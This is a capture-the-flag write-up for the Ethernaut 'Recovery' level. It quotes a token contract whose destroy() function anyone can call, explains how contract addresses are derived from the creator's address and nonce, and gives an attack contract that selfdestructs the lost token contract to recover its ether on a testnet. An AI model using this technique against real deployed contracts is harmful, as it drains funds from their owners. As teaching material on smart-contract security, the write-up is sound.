<img src="https://ethernaut.openzeppelin.com/imgs/BigLevel17.svg">


# Target Contract Review

Given contract.

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {

  //generate tokens
  function generateToken(string memory _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);
  
  }
}

contract SimpleToken {

  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value * 10;
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public { 
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender] - _amount;
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}
```

Challenge's message:

> A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent 0.001 ether to obtain more tokens. They have since lost the contract address. This level will be completed if you can recover (or remove) the 0.001 ether from the lost contract address.

This challenge is quite easy. Basically, the Recovery contract generates a token with the bits of help of the SimpleToken contract. The important thing about the SimpleToken contract is it has a **destroy()** function which selfdestruct the contract addresses. 


## Contract Address Calculating

The address for an Ethereum contract is deterministically computed from the address of its creator (sender) and how many transactions the creator has sent (nonce). The sender and nonce are RLP encoded and then hashed with Keccak-256. Here is an example calculator code in Solidity.

```solidity
bytes32 hash = keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), sender, bytes1(0x01)));
address addr = address(uint160(uint256(hash)));
```

First, it finds the hash and computed the contract address. More about [this topic.](https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed)

# Subverting

The only thing we must to do is calculate lost contract's address and selfdestruct it. Here is our short attack contract.

```solidity
pragma solidity ^0.8.20;

import './Recovery.sol';

contract Attack{

    SimpleToken target;
    address public addr;

    constructor(address payable _challenge){
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), _challenge, bytes1(0x01)));
        addr = address(uint160(uint256(hash)));
        target = SimpleToken(payable(addr));
    }

    function attack()external{
        target.destroy(payable(msg.sender));
    }

}
```

Deploy the attack contract with target contract's address. See the transaction on [etherscan.](https://sepolia.etherscan.io/tx/0x0e33934f10ffdc3871d13cf4f9d743f320c1e9c57a89a58145482b1d05990d8b)

We find the lost contract's address. It is 0x28f5b51501A6aAaE8007269761653320b3311355.

<p align="center"><img src="https://github.com/wasny0ps/Ethernaut-Challenges/blob/main/Challenges/Recovery/src/addr.png"></p>

Let's check it's balance on [etherscan.](https://sepolia.etherscan.io/address/0x28f5b51501A6aAaE8007269761653320b3311355)

<p align="center"><img src="https://github.com/wasny0ps/Ethernaut-Challenges/blob/main/Challenges/Recovery/src/contract_balance.png"></p>

Call attack function and check the contract's balance again. And passed the challenge! See the transaction on [etherscan.](https://sepolia.etherscan.io/tx/0x31de724d57975cc3a434ac8f5ffb9b6155a386929d530bb59080878412b8bbb7)

<p align="center"><img src="https://github.com/wasny0ps/Ethernaut-Challenges/blob/main/Challenges/Recovery/src/new_contract_balance.png"></p>


Ethernaut's message:

> Contract addresses are deterministic and are calculated by keccak256(address, nonce) where the address is the address of the contract (or ethereum address that created the transaction) and nonce is the number of contracts the spawning contract has created (or the transaction nonce, for regular transactions). Because of this, one can send ether to a pre-determined address (which has no private key) and later create a contract at that address which recovers the ether. This is a non-intuitive and somewhat secretive way to (dangerously) store ether without holding a private key.


**_by wasny0ps_**
